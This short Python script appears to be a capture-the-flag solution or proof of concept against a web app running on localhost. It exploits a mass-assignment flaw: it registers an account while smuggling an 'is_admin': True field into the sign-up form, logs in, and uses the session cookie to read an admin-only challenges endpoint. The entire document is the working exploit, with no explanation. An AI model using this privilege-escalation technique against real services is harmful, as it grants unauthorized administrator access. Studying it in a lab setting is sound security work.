import requests 

url = "http://localhost:5000"
ID = PW = "bbbb"
r = requests.post(
    f"{url}/register/", 
    data={
        "username": ID, 
        "password": PW, 
        "is_admin": True
    }
)

assert r.status_code == 200

r = requests.post(
    f"{url}/login/", 
    data={
        "username": ID, 
        "password": PW
    },
    allow_redirects=False
)

r = requests.get( 
    f"{url}/api/admin/challenges", 
    cookies=r.cookies.get_dict()   
)
print(r.text)